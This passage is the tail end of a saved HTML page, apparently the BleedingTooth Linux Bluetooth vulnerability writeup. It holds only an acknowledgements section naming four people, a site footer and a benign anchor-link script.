<h2 id="thanks">Thanks<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#thanks" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2>

<p>Dirk Göhmann<br>
Eduardo Vela<br>
Francis Perron<br>
Jann Horn</p>


      
      <div class="footer border-top border-gray-light mt-5 pt-3 text-right text-gray">
        This site is open source. <a href="https://github.com/google/security-research/edit/master/pocs/linux/bleedingtooth/writeup.md">Improve this page</a>.
      </div>
      
    </div>
    <script src="./2021 - BleedingTooth Linux Bluetooth Zero-Click Remote Code Execution_files/anchor.min.js.下載" integrity="sha256-lZaRhKri35AyJSypXXs4o6OPFTbTmUoltBbDCbdzegg=" crossorigin="anonymous"></script>
    <script>anchors.add();</script>
  

</body></html>